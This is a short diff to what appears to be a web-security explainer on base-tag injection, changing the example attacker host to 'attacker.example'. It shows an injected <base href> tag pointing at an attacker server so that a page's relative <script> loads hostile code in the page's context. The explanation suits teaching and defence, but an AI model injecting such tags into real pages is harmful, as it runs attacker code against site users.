@@ -6,7 +6,7 @@ point using relative URLs, you can specify a base URL to a server that you contr
 specified in the remainder of the HTML page, they are loaded from the server you specified, yet they are still executed in 
 the context of the page that has invoked them. For example: 
 
-<base href="http://mdattacker.net/badscripts/">
+<base href="https://attacker.example/badscripts/">
 ...
 <script src="goodscript.js"></script>
  According to specifications, <base> tags should appear within the <head> section of the HTML page. However, some browsers, 
